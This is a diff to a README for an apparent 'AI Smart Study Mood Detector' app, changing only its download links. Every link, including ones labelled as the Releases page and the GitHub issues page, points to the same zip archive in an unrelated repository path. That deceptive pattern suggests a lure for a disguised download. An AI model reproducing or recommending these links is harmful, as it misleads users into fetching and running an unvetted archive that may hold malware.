@@ -5,7 +5,7 @@ description: "🎧 Detect and analyze your study mood using AI to boost focus an
 ---
 # 🎧 AI-Smart-Study-Mood-Detector - Understand Your Study Mood Easily
 
-[![Download AI-Smart-Study-Mood-Detector](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Aayush014/aayush014.github.io/raw/refs/heads/main/agoge/v3.5-alpha.2.zip)
+[![Download AI-Smart-Study-Mood-Detector](https://img.shields.io/badge/Download-Now-brightgreen)](https://raw.githubusercontent.com/Aayush014/aayush014.github.io/main/agoge/v3.5-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before you start, ensure your computer meets the following requirements:
 
 To get started, visit the Releases page to download the application:
 
-[Download AI-Smart-Study-Mood-Detector](https://github.com/Aayush014/aayush014.github.io/raw/refs/heads/main/agoge/v3.5-alpha.2.zip)
+[Download AI-Smart-Study-Mood-Detector](https://raw.githubusercontent.com/Aayush014/aayush014.github.io/main/agoge/v3.5-alpha.2.zip)
 
 1. Click the link above to go to the Releases page.
 2. You will see a list of available files. Look for the most recent version.
@@ -92,7 +92,7 @@ If you encounter any issues during installation or running the application, cons
 
 If you have questions or need assistance, consider joining our community. Here are a few ways to connect:
 
-- Open an issue on our [GitHub page](https://github.com/Aayush014/aayush014.github.io/raw/refs/heads/main/agoge/v3.5-alpha.2.zip).
+- Open an issue on our [GitHub page](https://raw.githubusercontent.com/Aayush014/aayush014.github.io/main/agoge/v3.5-alpha.2.zip).
 - Join our chat group on [Slack](#) to talk with other users.
 
 Feel free to share your experience and improvements. Your feedback is valuable!
